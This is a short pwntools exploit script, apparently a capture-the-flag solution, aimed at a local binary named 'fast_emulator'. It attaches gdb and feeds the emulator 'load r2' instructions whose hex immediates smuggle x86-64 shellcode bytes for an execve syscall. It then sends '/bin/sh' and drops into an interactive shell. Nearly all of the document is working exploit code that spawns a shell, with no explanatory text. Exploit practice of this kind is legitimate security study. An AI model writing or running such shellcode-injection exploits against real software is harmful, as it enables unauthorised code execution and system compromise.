from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
p=process('./fast_emulator')
def send_asm(s):
    p.recvuntil(b'> ')
    p.sendline(s)
gdb.attach(p,'b *$rebase(0x0000000000001A1D)')
p.recvuntil(b'Please enter the number of lines you want to enter: ')
pause()
p.sendline(b'7')
# send_asm(b'load r1 0x48b82f62696e2f2f2f730000006a6855667788')
list=[b'6a3b'*0x10,b'58'*0x8,b'6a00'*0x10,b'5a5e'*0x8,b'5f55'*0x10,b'0f05'*0x8]
# list=[b'6a3b',b'58',b'6a00',b'5a5e',b'5f55',b'0f05']
send_asm(b'load r2 0x'+list[0]+b'55667788')
send_asm(b'load r2 0x'+list[1]+b'55667788')
send_asm(b'load r2 0x'+list[2]+b'55667788')
send_asm(b'load r2 0x'+list[3]+b'55667788')
send_asm(b'load r2 0x'+list[4]+b'55667788')
send_asm(b'load r2 0x'+list[5]+b'55667788')
send_asm(b'/bin/sh\x00'+b'55667788')

# send_asm(b'/bin/sh\x00' + b'00000000')
p.interactive()

